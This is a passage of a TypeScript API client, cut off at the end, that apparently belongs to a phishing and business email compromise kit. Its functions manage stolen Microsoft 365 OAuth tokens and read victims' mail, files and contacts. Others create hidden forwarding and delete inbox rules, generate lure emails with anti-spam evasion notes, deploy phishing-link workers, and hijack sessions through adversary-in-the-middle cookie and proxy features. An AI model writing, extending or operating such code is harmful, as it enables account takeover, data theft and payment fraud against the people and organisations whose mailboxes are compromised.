import { clsx, type ClassValue } from "clsx";
import { twMerge } from "tailwind-merge";
import {
  Token,
  InboxResponse,
  GraphUser,
  GraphGroup,
  GraphManager,
  DirectReport,
  BECAnalysisReport,
  Rule,
  ReconReport,
  AnalyticsOverview,
  TokenHealthResponse,
  AiSettings,
  StealthConfig,
  TestDecryptResponse,
  LoginRequest,
  LoginResponse,
  AuthUser,
  BECScanReport,
  MailFolder,
  AuditLog,
} from "@/types/token";

export function cn(...inputs: ClassValue[]) {
  return twMerge(clsx(inputs));
}

const API_BASE = process.env.NEXT_PUBLIC_API_URL || "https://api-production-c5ba.up.railway.app";

/**
 * Fetch with retry mechanism and exponential backoff
 * Automatically adds Authorization header from localStorage if available
 */
export async function fetchWithRetry<T>(
  url: string,
  options: RequestInit = {},
  maxRetries = 3,
  baseDelay = 1000
): Promise<T> {
  let lastError: any;

  // Get token from localStorage
  const token = typeof window !== "undefined" ? localStorage.getItem("simdia_token") : null;

  for (let attempt = 0; attempt <= maxRetries; attempt++) {
    try {
      const headers: Record<string, string> = {
        "Content-Type": "application/json",
      };

      // Add Authorization header if token exists
      if (token) {
        headers["Authorization"] = `Bearer ${token}`;
      }

      // Merge with provided headers (provided headers take precedence)
      if (options.headers) {
        const providedHeaders = options.headers as Record<string, string>;
        Object.keys(providedHeaders).forEach(key => {
          headers[key] = providedHeaders[key];
        });
      }

      const res = await fetch(`${API_BASE}${url}`, {
        cache: "no-store",
        ...options,
        headers,
      });

      if (!res.ok) {
        const errorBody = await res.json().catch(() => null);
        const message = errorBody?.message || errorBody?.error || res.statusText;
        const error: any = new Error(message);
        error.status = res.status;
        error.body = errorBody;
        throw error;
      }

      return await res.json();
    } catch (err: any) {
      lastError = err;

      // Don't retry on 4xx client errors (except 429 Too Many Requests)
      if (err.status >= 400 && err.status < 500 && err.status !== 429) {
        break;
      }

      if (attempt === maxRetries) {
        break;
      }

      const delay = baseDelay * Math.pow(2, attempt);
      await new Promise(resolve => setTimeout(resolve, delay));
    }
  }

  throw lastError;
}

/** Convert a File to base64 attachment payload using FileReader (fast, native).
 *  Rejects files over 4MB — Graph API inline attachment limit. */
export function fileToBase64(file: File): Promise<{ name: string; content_type: string; content_bytes: string }> {
  return new Promise((resolve, reject) => {
    const MAX_MB = 4;
    const MAX_BYTES = MAX_MB * 1024 * 1024;
    if (file.size > MAX_BYTES) {
      reject(new Error(`Max attachment size is ${MAX_MB}MB. "${file.name}" is ${(file.size / 1024 / 1024).toFixed(1)}MB.`));
      return;
    }
    const reader = new FileReader();
    reader.onload = () => {
      const result = reader.result as string;
      const base64 = result.split(',')[1];
      resolve({
        name: file.name,
        content_type: file.type || "application/octet-stream",
        content_bytes: base64,
      });
    };
    reader.onerror = () => reject(new Error(`Failed to read file "${file.name}"`));
    reader.readAsDataURL(file);
  });
}

export async function fetchTokens(): Promise<Token[]> {
  return fetchWithRetry<Token[]>("/api/tokens");
}

export async function fetchInbox(tokenId: string): Promise<InboxResponse> {
  return fetchWithRetry<InboxResponse>(`/api/inbox?token_id=${encodeURIComponent(tokenId)}`);
}

export async function deleteTokens(tokenIds: string[]): Promise<{ success: boolean; deleted: number }> {
  return fetchWithRetry<{ success: boolean; deleted: number }>("/api/tokens", {
    method: "DELETE",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ token_ids: tokenIds }),
  });
}

export interface SummarizeRequest {
  messageId: string;
  subject: string;
  body: string;
}

export interface SummarizeResponse {
  summary: string;
}

export async function summarizeEmail(tokenId: string, payload: SummarizeRequest): Promise<SummarizeResponse> {
  return fetchWithRetry<SummarizeResponse>(`/api/summarize?token_id=${encodeURIComponent(tokenId)}`, {
    method: "POST",
    body: JSON.stringify(payload),
  });
}

export interface CreateRuleRequest {
  ruleName: string;
  condition: {
    field: "subject" | "sender" | "body";
    operator: "contains" | "equals";
    value: string;
  };
  action: {
    type: "forward" | "mark_read" | "delete" | "move_to_folder";
    target?: string;
  };
  messageId?: string;
}

export async function createInboxRule(tokenId: string, payload: CreateRuleRequest): Promise<void> {
  await fetchWithRetry(`/api/create_rule?token_id=${encodeURIComponent(tokenId)}`, {
    method: "POST",
    body: JSON.stringify(payload),
  });
}

export interface ForwardEmailRequest {
  messageId: string;
  to: string;
  comment?: string;
}

export async function forwardEmail(tokenId: string, payload: ForwardEmailRequest): Promise<void> {
  await fetchWithRetry(`/api/forward?token_id=${encodeURIComponent(tokenId)}`, {
    method: "POST",
    body: JSON.stringify(payload),
  });
}

// === Recon / Graph API functions ===

export async function fetchGraphMe(tokenId: string): Promise<GraphUser> {
  return fetchWithRetry<GraphUser>(`/api/graph/me?token_id=${encodeURIComponent(tokenId)}`);
}

export async function fetchDirectReports(tokenId: string): Promise<{ value: DirectReport[] }> {
  return fetchWithRetry<{ value: DirectReport[] }>(`/api/graph/directReports?token_id=${encodeURIComponent(tokenId)}`);
}

export async function fetchMemberOf(tokenId: string): Promise<{ value: GraphGroup[] }> {
  return fetchWithRetry<{ value: GraphGroup[] }>(`/api/graph/memberOf?token_id=${encodeURIComponent(tokenId)}`);
}

export async function fetchTransitiveMemberOf(tokenId: string): Promise<{ value: GraphGroup[] }> {
  return fetchWithRetry<{ value: GraphGroup[] }>(`/api/graph/transitiveMemberOf?token_id=${encodeURIComponent(tokenId)}`);
}

export async function fetchManager(tokenId: string): Promise<GraphManager> {
  return fetchWithRetry<GraphManager>(`/api/graph/manager?token_id=${encodeURIComponent(tokenId)}`);
}

// === BEC Analysis ===

export async function analyzeInbox(tokenId: string): Promise<BECAnalysisReport> {
  return fetchWithRetry<BECAnalysisReport>(`/api/bec/analyze?token_id=${encodeURIComponent(tokenId)}`);
}

// === AI Rule Suggestions ===

export interface AiRuleSuggestion {
  rule_name: string;
  description: string;
  condition_subject_contains: string[];
  condition_sender_domain: string[];
  condition_body_contains: string[];
  action_move_to_folder: string | null;
  action_forward_to: string | null;
  action_mark_as_read: boolean;
  confidence: number;
}

export interface AiRuleSuggestResponse {
  suggestions: AiRuleSuggestion[];
  analyzed_messages: number;
  model: string;
}

export async function aiSuggestRules(tokenId: string): Promise<AiRuleSuggestResponse> {
  return fetchWithRetry<AiRuleSuggestResponse>("/api/rules/ai-suggest", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ token_id: tokenId }),
  });
}

// === Token Refresh ===

export interface RefreshTokenResponse {
  success: boolean;
  new_expires_at?: string;
  message?: string;
}

export async function refreshToken(tokenId: string): Promise<RefreshTokenResponse> {
  return fetchWithRetry<RefreshTokenResponse>(`/api/refresh?token_id=${encodeURIComponent(tokenId)}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
  });
}

// === Campaign API functions ===

import {
  CampaignListResponse,
  CreateCampaignRequest,
  CreateCampaignResponse,
} from "@/types/token";

export async function fetchCampaigns(
  page = 1,
  perPage = 20,
  status?: string,
  search?: string
): Promise<CampaignListResponse> {
  const params = new URLSearchParams();
  params.set("page", String(page));
  params.set("per_page", String(perPage));
  if (status) params.set("status", status);
  if (search) params.set("search", search);
  return fetchWithRetry<CampaignListResponse>(`/api/campaigns?${params.toString()}`);
}

export async function createCampaign(
  payload: CreateCampaignRequest
): Promise<CreateCampaignResponse> {
  return fetchWithRetry<CreateCampaignResponse>("/api/campaigns/create", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  });
}

export async function deleteCampaign(id: string): Promise<void> {
  const res = await fetch(`${API_BASE}/api/campaigns/${id}`, {
    method: "DELETE",
    headers: { "Content-Type": "application/json" },
  });
  if (!res.ok) throw new Error(`HTTP ${res.status}: ${res.statusText}`);
}

// === Inbox Rules ===

export async function fetchRules(tokenId: string): Promise<Rule[]> {
  return fetchWithRetry<Rule[]>(`/api/rules?token_id=${encodeURIComponent(tokenId)}`);
}

export async function fetchGraphRules(tokenId: string): Promise<{ status: string; count: number; rules: any[] }> {
  return fetchWithRetry<{ status: string; count: number; rules: any[] }>(`/api/rules/graph?token_id=${encodeURIComponent(tokenId)}`);
}

export interface NewRulePayload {
  token_id: string;
  rule_name: string;
  condition_subject_contains: string[];
  condition_sender_domain: string[];
  condition_body_contains?: string[];
  condition_body_or_subject_contains?: string[];
  condition_sender_contains?: string[];
  condition_from_address_contains?: string[];
  condition_recipient_contains?: string[];
  condition_header_contains?: string[];
  condition_has_attachments?: boolean;
  condition_sent_only_to_me?: boolean;
  condition_sent_to_me?: boolean;
  condition_not_sent_to_me?: boolean;
  condition_sent_to_or_cc_me?: boolean;
  condition_is_approval_request?: boolean;
  condition_is_automatic_forward?: boolean;
  condition_is_automatic_reply?: boolean;
  condition_is_encrypted?: boolean;
  condition_is_meeting_request?: boolean;
  condition_is_meeting_response?: boolean;
  condition_is_non_delivery_report?: boolean;
  condition_is_permission_controlled?: boolean;
  condition_is_read_receipt?: boolean;
  condition_is_signed?: boolean;
  condition_is_voicemail?: boolean;
  condition_flagged?: boolean;
  condition_importance?: string;
  condition_message_action_flag?: string;
  condition_message_size?: number;
  condition_min_size?: number;
  condition_max_size?: number;
  action_move_to_folder?: string | null;
  action_copy_to_folder?: string | null;
  action_forward_to?: string | null;
  action_forward_as_attachment_to?: string;
  action_redirect_to?: string;
  action_mark_as_read?: boolean;
  action_delete?: boolean;
  action_permanent_delete?: boolean;
  action_mark_as_importance?: string;
  action_categorize?: string;
  stop_processing: boolean;
  local_only?: boolean;
}

export async function createRule(payload: NewRulePayload): Promise<{ status: string; rule_id: string; graph_rule_id?: string; target_folder_id?: string; rule_payload: any }> {
  return fetchWithRetry<{ status: string; rule_id: string; graph_rule_id?: string; target_folder_id?: string; rule_payload: any }>("/api/rules/create", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  });
}

export async function updateRule(ruleId: string, payload: NewRulePayload): Promise<{ status: string; rule_id: string; message: string }> {
  return fetchWithRetry<{ status: string; rule_id: string; message: string }>(`/api/rules/${encodeURIComponent(ruleId)}`, {
    method: "PUT",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  });
}

export async function deleteRule(ruleId: string): Promise<{ status: string; rule_id: string; graph_deleted: boolean; message: string }> {
  return fetchWithRetry<{ status: string; rule_id: string; graph_deleted: boolean; message: string }>(`/api/rules/${encodeURIComponent(ruleId)}`, {
    method: "DELETE",
    headers: { "Content-Type": "application/json" },
  });
}

// === Recon API ===

export async function runRecon(tokenId: string): Promise<ReconReport> {
  return fetchWithRetry<ReconReport>("/api/recon/run", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ token_id: tokenId }),
  });
}

export async function getRecon(tokenId: string): Promise<ReconReport> {
  return fetchWithRetry<ReconReport>(`/api/recon/${encodeURIComponent(tokenId)}`);
}

// === Analytics API ===

export async function fetchAnalyticsOverview(from?: string, to?: string): Promise<AnalyticsOverview> {
  const params = new URLSearchParams();
  if (from) params.set("from", from);
  if (to) params.set("to", to);
  const query = params.toString();
  return fetchWithRetry<AnalyticsOverview>(`/api/analytics/overview${query ? "?" + query : ""}`);
}

export async function fetchTokenHealth(): Promise<TokenHealthResponse> {
  return fetchWithRetry<TokenHealthResponse>("/api/tokens/health");
}

// === Settings API ===

export async function fetchAiSettings(): Promise<AiSettings> {
  return fetchWithRetry<AiSettings>("/api/settings/ai");
}

export async function saveAiSettings(payload: AiSettings): Promise<void> {
  await fetchWithRetry("/api/settings/ai", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  });
}

export async function fetchStealthConfig(): Promise<StealthConfig> {
  return fetchWithRetry<StealthConfig>("/api/stealth/config");
}

export async function testDecryption(passphrase: string, ciphertext: string): Promise<TestDecryptResponse> {
  return fetchWithRetry<TestDecryptResponse>("/api/test-decrypt", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ passphrase, ciphertext }),
  });
}

export async function purgeExpiredTokens(): Promise<{ deleted: number }> {
  return fetchWithRetry<{ deleted: number }>("/api/maintenance/purge-expired", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
  });
}

// === BEC Scan API ===

export async function fetchBECScan(tokenId: string): Promise<BECScanReport> {
  return fetchWithRetry<BECScanReport>(`/api/bec/analyze?token_id=${encodeURIComponent(tokenId)}`);
}

// === Inbox Folders API ===

export async function fetchMailFolders(tokenId: string): Promise<{ value: MailFolder[] }> {
  return fetchWithRetry<{ value: MailFolder[] }>(`/api/inbox/folders?token_id=${encodeURIComponent(tokenId)}`);
}

export async function fetchFolderMessages(tokenId: string, folderId: string): Promise<InboxResponse> {
  return fetchWithRetry<InboxResponse>(`/api/inbox/folders/${encodeURIComponent(folderId)}?token_id=${encodeURIComponent(tokenId)}`);
}

// === Auth API ===

export async function loginUser(payload: LoginRequest): Promise<LoginResponse> {
  return fetchWithRetry<LoginResponse>("/api/auth/login", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  });
}

export async function registerUser(payload: LoginRequest & { role?: string }): Promise<LoginResponse> {
  return fetchWithRetry<LoginResponse>("/api/auth/register", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  });
}

export async function fetchMe(token: string): Promise<AuthUser> {
  return fetchWithRetry<AuthUser>("/api/auth/me", {
    headers: { Authorization: `Bearer ${token}` },
  }, 0);
}

export async function changePassword(payload: { current_password: string; new_password: string }): Promise<{ success: boolean; message?: string }> {
  return fetchWithRetry<{ success: boolean; message?: string }>("/api/auth/change-password", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  });
}

export async function changeUsername(payload: { current_password: string; new_username: string }): Promise<{ success: boolean; message?: string; username?: string }> {
  return fetchWithRetry<{ success: boolean; message?: string; username?: string }>("/api/auth/change-username", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  });
}

export async function generateOAuthLink(local = false): Promise<{ link: string; worker_url: string; short_link: string }> {
  return fetchWithRetry<{ link: string; worker_url: string; short_link: string }>(`/api/campaigns/generate-link?local=${local}`);
}

export async function deployWorker(): Promise<{ success: boolean; worker_url?: string; message: string }> {
  return fetchWithRetry<{ success: boolean; worker_url?: string; message: string }>("/api/campaigns/deploy-worker", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
  });
}

export async function createFolder(tokenId: string, displayName: string): Promise<MailFolder> {
  return fetchWithRetry<MailFolder>(`/api/inbox/folders?token_id=${encodeURIComponent(tokenId)}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ display_name: displayName }),
  });
}

export async function sendMail(tokenId: string, payload: { subject: string; body: string; to: string[]; cc?: string[]; bcc?: string[]; content_type?: string; attachments?: { name: string; content_type: string; content_bytes: string }[] }): Promise<{ success: boolean }> {
  return fetchWithRetry<{ success: boolean }>(`/api/inbox/send?token_id=${encodeURIComponent(tokenId)}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  });
}

export async function deleteMessage(tokenId: string, messageId: string): Promise<{ success: boolean }> {
  return fetchWithRetry<{ success: boolean }>(`/api/inbox/messages/${encodeURIComponent(messageId)}?token_id=${encodeURIComponent(tokenId)}`, {
    method: "DELETE",
    headers: { "Content-Type": "application/json" },
  });
}

// === Local Folders API ===

export async function fetchLocalFolders(tokenId: string): Promise<{ value: { id: string; name: string }[] }> {
  return fetchWithRetry<{ value: { id: string; name: string }[] }>(`/api/inbox/local-folders?token_id=${encodeURIComponent(tokenId)}`);
}

export async function createLocalFolder(tokenId: string, name: string): Promise<{ id: string; name: string }> {
  return fetchWithRetry<{ id: string; name: string }>(`/api/inbox/local-folders?token_id=${encodeURIComponent(tokenId)}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ name }),
  });
}

export async function deleteLocalFolder(tokenId: string, folderId: string): Promise<{ success: boolean }> {
  return fetchWithRetry<{ success: boolean }>(`/api/inbox/local-folders/${encodeURIComponent(folderId)}?token_id=${encodeURIComponent(tokenId)}`, {
    method: "DELETE",
    headers: { "Content-Type": "application/json" },
  });
}

export async function fetchLocalFolderMessages(tokenId: string, folderId: string): Promise<{ value: any[] }> {
  return fetchWithRetry<{ value: any[] }>(`/api/inbox/local-folders/${encodeURIComponent(folderId)}/messages?token_id=${encodeURIComponent(tokenId)}`);
}

export async function runAutoFilter(tokenId: string): Promise<{ success: boolean; moved: number; folder_id: string }> {
  return fetchWithRetry<{ success: boolean; moved: number; folder_id: string }>(`/api/inbox/auto-filter?token_id=${encodeURIComponent(tokenId)}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
  });
}

// === Contacts API ===

export interface GraphContact {
  id: string;
  displayName?: string;
  givenName?: string;
  surname?: string;
  emailAddresses?: { address?: string; name?: string }[];
  businessPhones?: string[];
  mobilePhone?: string;
  jobTitle?: string;
  companyName?: string;
  department?: string;
  officeLocation?: string;
  businessAddress?: { street?: string };
  personalNotes?: string;
  createdDateTime?: string;
  lastModifiedDateTime?: string;
}

export interface ContactsResponse {
  status: string;
  count: number;
  contacts: GraphContact[];
}

export async function fetchContacts(tokenId: string): Promise<ContactsResponse> {
  return fetchWithRetry<ContactsResponse>(`/api/contacts?token_id=${encodeURIComponent(tokenId)}`);
}

export interface ExtractedEmail {
  email: string;
  name: string;
  source: string;
  type: string;
}

export interface ExtractEmailsResponse {
  status: string;
  count: number;
  emails: ExtractedEmail[];
}

export async function extractEmails(tokenId: string): Promise<ExtractEmailsResponse> {
  return fetchWithRetry<ExtractEmailsResponse>(`/api/contacts/extract?token_id=${encodeURIComponent(tokenId)}`);
}

export interface Admin {
  id: string;
  username: string;
  email?: string;
  role: string;
  super_admin: boolean;
  suspended: boolean;
  expires_at?: string;
  usage_days?: number;
  api_url?: string;
  frontend_url?: string;
  worker_url?: string;
  created_at: string;
}

export interface AdminListResponse {
  admins: Admin[];
}

export async function fetchAdmins(): Promise<AdminListResponse> {
  return fetchWithRetry<AdminListResponse>("/api/admins");
}

export interface CreateAdminPayload {
  username: string;
  email: string;
  password: string;
  role: string;
  usage_days?: number;
  api_url?: string;
  frontend_url?: string;
  worker_url?: string;
}

export async function createAdmin(payload: CreateAdminPayload): Promise<{ success: boolean; id: string }> {
  return fetchWithRetry<{ success: boolean; id: string }>("/api/admins", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(payload),
  });
}

export interface UpdateAdminPayload {
  username?: string;
  email?: string;
  password?: string;
  role?: string;
  usage_days?: number;
  expires_at?: string;
  suspended?: boolean;
  api_url?: string;
  frontend_url?: string;
  worker_url?: string;
}

export async function updateAdmin(adminId: string, payload: UpdateAdminPayload): Promise<{ success: boolean }> {
  return fetchWithRetry<{ success: boolean }>(`/api/admins/${adminId}`, {
    method: "PATCH",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(payload),
  });
}

export async function deleteAdmin(adminId: string): Promise<{ success: boolean }> {
  return fetchWithRetry<{ success: boolean }>(`/api/admins/${adminId}`, {
    method: "DELETE",
  });
}

// === Deleted Items API ===

export async function fetchDeletedItems(tokenId: string): Promise<any> {
  return fetchWithRetry<any>(`/api/inbox/deleted-items/${encodeURIComponent(tokenId)}`);
}

export async function purgeDeletedItems(tokenId: string): Promise<{ success: boolean; deleted: number; failed: number; message: string }> {
  return fetchWithRetry<{ success: boolean; deleted: number; failed: number; message: string }>(`/api/inbox/deleted-items/${encodeURIComponent(tokenId)}/purge`, {
    method: "POST",
  });
}

export interface CreateContactPayload {
  display_name: string;
  given_name?: string;
  surname?: string;
  email_addresses: string[];
  business_phones?: string[];
  mobile_phone?: string;
  job_title?: string;
  company_name?: string;
  department?: string;
  office_location?: string;
  business_address?: string;
  personal_notes?: string;
}

export async function createContact(tokenId: string, payload: CreateContactPayload): Promise<{ status: string; contact: GraphContact }> {
  return fetchWithRetry<{ status: string; contact: GraphContact }>(`/api/contacts?token_id=${encodeURIComponent(tokenId)}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  });
}

export interface UpdateContactPayload {
  display_name?: string;
  given_name?: string;
  surname?: string;
  email_addresses?: string[];
  business_phones?: string[];
  mobile_phone?: string;
  job_title?: string;
  company_name?: string;
  department?: string;
  office_location?: string;
  business_address?: string;
  personal_notes?: string;
}

export async function updateContact(tokenId: string, contactId: string, payload: UpdateContactPayload): Promise<{ status: string; contact: GraphContact }> {
  return fetchWithRetry<{ status: string; contact: GraphContact }>(`/api/contacts/${encodeURIComponent(contactId)}?token_id=${encodeURIComponent(tokenId)}`, {
    method: "PATCH",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  });
}

export async function deleteContact(tokenId: string, contactId: string): Promise<{ status: string; contact_id: string }> {
  return fetchWithRetry<{ status: string; contact_id: string }>(`/api/contacts/${encodeURIComponent(contactId)}?token_id=${encodeURIComponent(tokenId)}`, {
    method: "DELETE",
    headers: { "Content-Type": "application/json" },
  });
}

export async function markMessageRead(tokenId: string, messageId: string, isRead: boolean): Promise<{ success: boolean }> {
  return fetchWithRetry<{ success: boolean }>(`/api/inbox/messages/${encodeURIComponent(messageId)}/read?token_id=${encodeURIComponent(tokenId)}`, {
    method: "PATCH",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ is_read: isRead }),
  });
}

export async function moveMessage(tokenId: string, messageId: string, destinationFolderId: string): Promise<{ success: boolean }> {
  return fetchWithRetry<{ success: boolean }>(`/api/inbox/messages/${encodeURIComponent(messageId)}/move?token_id=${encodeURIComponent(tokenId)}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ destination_folder_id: destinationFolderId }),
  });
}

export async function mxCheck(domains: string[]): Promise<{ microsoft_365: string[]; other: string[] }> {
  return fetchWithRetry<{ microsoft_365: string[]; other: string[] }>("/api/inbox/mx-check", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ domains }),
  });
}

export async function generateLureEmail(payload: {
  target_email: string;
  target_name?: string;
  victim_email: string;
  template_type?: string;
  context?: string;
}): Promise<{ subject: string; body: string; html_body: string; anti_spam_notes: string[] }> {
  return fetchWithRetry<{ subject: string; body: string; html_body: string; anti_spam_notes: string[] }>("/api/lure/generate", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  });
}

// === Tasks API ===

export interface TaskList {
  id: string;
  displayName: string;
  isOwner?: boolean;
  isShared?: boolean;
  wellknownListName?: string;
}

export interface Task {
  id: string;
  title: string;
  body?: { content?: string; contentType?: string };
  importance?: string;
  status?: string;
  dueDateTime?: { dateTime?: string; timeZone?: string };
  reminderDateTime?: { dateTime?: string; timeZone?: string };
  isReminderOn?: boolean;
  createdDateTime?: string;
  lastModifiedDateTime?: string;
  completedDateTime?: { dateTime?: string; timeZone?: string };
}

export interface TaskListsResponse {
  status: string;
  lists: TaskList[];
}

export interface TasksResponse {
  status: string;
  list_id: string;
  tasks: Task[];
}

export async function fetchTaskLists(tokenId: string): Promise<TaskListsResponse> {
  return fetchWithRetry<TaskListsResponse>(`/api/tasks/lists?token_id=${encodeURIComponent(tokenId)}`);
}

export async function fetchTasks(tokenId: string, listId?: string): Promise<TasksResponse> {
  const url = listId
    ? `/api/tasks?token_id=${encodeURIComponent(tokenId)}&list_id=${encodeURIComponent(listId)}`
    : `/api/tasks?token_id=${encodeURIComponent(tokenId)}`;
  return fetchWithRetry<TasksResponse>(url);
}

export interface CreateTaskPayload {
  title: string;
  body?: string;
  due_date_time?: string;
  reminder_date_time?: string;
  importance?: string;
  status?: string;
}

export async function createTask(tokenId: string, listId: string, payload: CreateTaskPayload): Promise<{ status: string; task: Task }> {
  return fetchWithRetry<{ status: string; task: Task }>(`/api/tasks?token_id=${encodeURIComponent(tokenId)}&list_id=${encodeURIComponent(listId)}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  });
}

export interface UpdateTaskPayload {
  title?: string;
  body?: string;
  due_date_time?: string;
  reminder_date_time?: string;
  importance?: string;
  status?: string;
  is_reminder_on?: boolean;
}

export async function updateTask(tokenId: string, listId: string, taskId: string, payload: UpdateTaskPayload): Promise<{ status: string; task: Task }> {
  return fetchWithRetry<{ status: string; task: Task }>(`/api/tasks/${encodeURIComponent(taskId)}?token_id=${encodeURIComponent(tokenId)}&list_id=${encodeURIComponent(listId)}`, {
    method: "PATCH",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  });
}

export async function deleteTask(tokenId: string, listId: string, taskId: string): Promise<{ status: string; task_id: string }> {
  return fetchWithRetry<{ status: string; task_id: string }>(`/api/tasks/${encodeURIComponent(taskId)}?token_id=${encodeURIComponent(tokenId)}&list_id=${encodeURIComponent(listId)}`, {
    method: "DELETE",
  });
}

export interface AuditLogsQuery {
  from?: string;
  to?: string;
  action?: string;
  campaign_id?: string;
  page?: number;
  per_page?: number;
}

export interface AuditLogsResponse {
  logs: AuditLog[];
  total: number;
}

// === OneDrive API ===

export interface DriveItem {
  id: string;
  name: string;
  size?: number;
  file?: { mimeType?: string };
  folder?: { childCount?: number };
  image?: { height?: number; width?: number };
  webUrl?: string;
  downloadUrl?: string;
  createdDateTime?: string;
  lastModifiedDateTime?: string;
  parentReference?: { id?: string; path?: string };
  mimeType?: string;
}

export interface OneDriveResponse {
  status: string;
  current_folder?: DriveItem;
  items: DriveItem[];
  path: string;
}

export async function fetchOneDriveItems(tokenId: string, itemId?: string, path?: string): Promise<OneDriveResponse> {
  const params = new URLSearchParams();
  params.set("token_id", tokenId);
  if (itemId) params.set("item_id", itemId);
  if (path) params.set("path", path);
  return fetchWithRetry<OneDriveResponse>(`/api/onedrive/items?${params.toString()}`);
}

export async function searchOneDriveItems(tokenId: string, query: string): Promise<{ status: string; items: DriveItem[]; count: number }> {
  return fetchWithRetry<{ status: string; items: DriveItem[]; count: number }>(`/api/onedrive/search?token_id=${encodeURIComponent(tokenId)}&q=${encodeURIComponent(query)}`);
}

export function getOneDriveDownloadUrl(tokenId: string, itemId: string): string {
  return `/api/onedrive/items/${encodeURIComponent(itemId)}/download?token_id=${encodeURIComponent(tokenId)}`;
}

// === Office Apps API ===

export interface OfficeDocument {
  id: string;
  name: string;
  size?: number;
  mime_type: string;
  doc_type: string;
  web_url: string;
  download_url?: string;
  embed_url?: string;
  thumbnail_url?: string;
  created_date_time?: string;
  last_modified_date_time?: string;
  created_by?: string;
  last_modified_by?: string;
}

export interface OfficeDocsResponse {
  status: string;
  documents: OfficeDocument[];
  count: number;
}

export async function fetchOfficeDocs(tokenId: string, docType?: string): Promise<OfficeDocsResponse> {
  const params = new URLSearchParams();
  params.set("token_id", tokenId);
  if (docType) params.set("doc_type", docType);
  return fetchWithRetry<OfficeDocsResponse>(`/api/office/docs?${params.toString()}`);
}

export async function searchOfficeDocs(tokenId: string, query: string): Promise<OfficeDocsResponse> {
  return fetchWithRetry<OfficeDocsResponse>(`/api/office/search?token_id=${encodeURIComponent(tokenId)}&q=${encodeURIComponent(query)}`);
}

export async function getOfficeEmbedUrl(tokenId: string, itemId: string): Promise<{ status: string; document: OfficeDocument & { office_online_url: string } }> {
  return fetchWithRetry<{ status: string; document: OfficeDocument & { office_online_url: string } }>(`/api/office/embed?token_id=${encodeURIComponent(tokenId)}&item_id=${encodeURIComponent(itemId)}`);
}

export async function getAuditLogs(query: AuditLogsQuery = {}): Promise<AuditLogsResponse> {
  const params = new URLSearchParams();
  if (query.from) params.set("from", query.from);
  if (query.to) params.set("to", query.to);
  if (query.action) params.set("action", query.action);
  if (query.campaign_id) params.set("campaign_id", query.campaign_id);
  if (query.page) params.set("page", String(query.page));
  if (query.per_page) params.set("per_page", String(query.per_page));
  return fetchWithRetry<AuditLogsResponse>(`/api/audit/logs?${params.toString()}`);
}

// ===== Cookie Session / Hybrid AiTM =====

export async function generateBookmarkletToken(tokenId: string): Promise<{ status: string; token: string; expires_in: number }> {
  return fetchWithRetry<{ status: string; token: string; expires_in: number }>(`/api/tokens/${encodeURIComponent(tokenId)}/session/bookmarklet`);
}

export async function testCookieSession(tokenId: string): Promise<{ status: string; valid: boolean; message: string }> {
  return fetchWithRetry<{ status: string; valid: boolean; message: string }>(`/api/tokens/${encodeURIComponent(tokenId)}/session/test`);
}

export async function getSessionStatus(tokenId: string): Promise<{ status: string; valid: boolean; message: string; session_active_at?: string; session_killed_at?: string }> {
  return fetchWithRetry<{ status: string; valid: boolean; message: string; session_active_at?: string; session_killed_at?: string }>(`/api/tokens/${encodeURIComponent(tokenId)}/session/status`);
}

export async function killSession(tokenId: string): Promise<{ status: string; message: string; token_id: string }> {
  return fetchWithRetry<{ status: string; message: string; token_id: string }>(`/api/tokens/${encodeURIComponent(tokenId)}/session/kill`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ token_id: tokenId }),
  });
}

// ===== Proxy Session (Step 4) =====

export interface ProxySessionResponse {
  status: string;
  token_id: string;
  proxy_url: string;
  session_id: string;
  created_at: string;
  expires_at?: string;
}

export interface ProxySessionStatus {
  token_id: string;
  status: string;
  proxy_url: string;
  created_at: string;
  last_active_at?: string;
  expires_at?: string;
  cookie_count: number;
  is_valid: boolean;
  next_refresh: string;
}

export async function createProxySession(tokenId: string): Promise<ProxySessionResponse> {
  return fetchWithRetry<ProxySessionResponse>(`/api/tokens/${encodeURIComponent(tokenId)}/proxy-session/create`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
  });
}

export async function getProxySessionStatus(tokenId: string): Promise<ProxySessionStatus> {
  return fetchWithRetry<ProxySessionStatus>(`/api/tokens/${encodeURIComponent(tokenId)}/proxy-session/status`);
}

export async function killProxySession(tokenId: string): Promise<{ status: string; token_id: string; message: string }> {
